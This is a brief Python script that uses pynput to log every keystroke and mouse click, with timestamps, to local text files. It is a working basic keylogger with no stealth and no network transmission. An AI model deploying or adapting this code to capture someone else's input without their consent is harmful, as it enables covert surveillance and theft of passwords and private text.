from pynput.keyboard import Listener as KeyboardListener, Key
from pynput.mouse import Listener as MouseListener, Button
import datetime

def log_keyboard(key):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("keyboard_log.txt", "a") as f:
        f.write(f"[{timestamp}] {key}\n")

def log_mouse(x, y, button, pressed):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    action = "Pressed" if pressed else "Released"
    with open("mouse_log.txt", "a") as f:
        f.write(f"[{timestamp}] {action} {button} at ({x}, {y})\n")

# Keyboard listener
keyboard_listener = KeyboardListener(on_press=log_keyboard)

# Mouse listener
mouse_listener = MouseListener(on_click=log_mouse)

keyboard_listener.start()
mouse_listener.start()

keyboard_listener.join()
mouse_listener.join()